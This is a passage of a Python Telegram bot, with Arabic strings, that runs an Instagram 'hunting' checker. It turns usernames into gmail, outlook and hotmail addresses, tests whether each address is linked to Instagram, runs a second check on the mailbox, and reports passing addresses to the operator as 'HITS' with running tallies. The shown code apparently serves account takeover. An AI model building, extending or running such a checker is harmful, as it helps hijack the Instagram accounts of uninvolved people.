    ibnos=cheeckEmail(aa)
    if ibnos==True:
        bns=check_out_hot(aa)
        print(bns)
        good_insta+=1
        if bns ==True:
            good_hot+=1
            info(aa,chat_id)
        elif bns== False:
            bad_hot+=1
    elif ibnos== False:
        bad_insta+=1
def hso2(email,chat_id):
    global good_out,bad_out,good_insta,bad_insta
    aa=email+"@outlook.com"
    ibno=cheeckEmail(aa)
    if ibno==True:
        bn=check_out_hot(aa)
        good_insta+=1
        if bn ==True:
            good_out+=1
            info(aa,chat_id)
        elif bn== False:
            bad_out+=1
    elif ibno== False:
        bad_insta+=1
def hso1(email,chat_id):
    global good_gmail,bad_gmail,good_insta,bad_insta
    #while True:
    aa=email+"@gmail.com"
    insta=cheeckEmail(aa)
    if insta==True:
        gm=Ch(aa)
        good_insta+=1
        if gm==True:
            good_gmail+=1
            info(aa,chat_id)
        elif gm==False:
            bad_gmail+=1
    elif insta==False:
        bad_insta+=1
@bot.message_handler(commands=["info"])
def inn(message):
     global good_insta,good_gmail,bad_gmail,bad_insta,good_hot,bad_hot,good_out,bad_out,good_aol,bad_aol,hit
     add=len(open("test.txt").read().splitlines())
     tt=f'''
𝗛𝗜𝗧𝗦 : {good_out or good_gmail or good_hot or good_aol}
𝗕𝗔𝗗 𝗘𝗠𝗔𝗜𝗟 : {bad_aol or bad_gmail or bad_hot or bad_out}
𝗚𝗢𝗢𝗗 𝗜𝗡𝗦𝗧𝗔 : {good_insta}
𝗕𝗔𝗗 𝗜𝗡𝗦𝗧𝗔 : {bad_insta}
𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗘𝗥 : ...@hsopyt
𝗕𝗢𝗧 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 : 0.2
𝗧𝗢𝗧𝗔𝗟 : {good_gmail+good_insta+bad_gmail+bad_insta+good_aol+bad_aol+good_hot+bad_hot+good_out+bad_out}
𝗟𝗜𝗦𝗧 : {good_insta+bad_insta} / {add}
     '''
     bot.send_message(message.from_user.id,tt)
     if good_insta+bad_insta==add:
          bot.send_message(message.from_user.id,f"bro : {message.from_user.first_name}\n - Your file has been scanned.")
          good_insta,good_gmail,bad_gmail,bad_insta,good_hot,bad_hot,good_out,bad_out,good_aol,bad_aol,add,hit=0,0,0,0,0,0,0,0,0,0,0,0
bot.set_my_commands([
telebot.types.BotCommand("start","بدء"),
telebot.types.BotCommand("info","حالة الصيد او info Hiting ")
])
bot.infinity_polling()
""" الكود مكتوب بكل حنية وحنان رجائن لا تعبث به """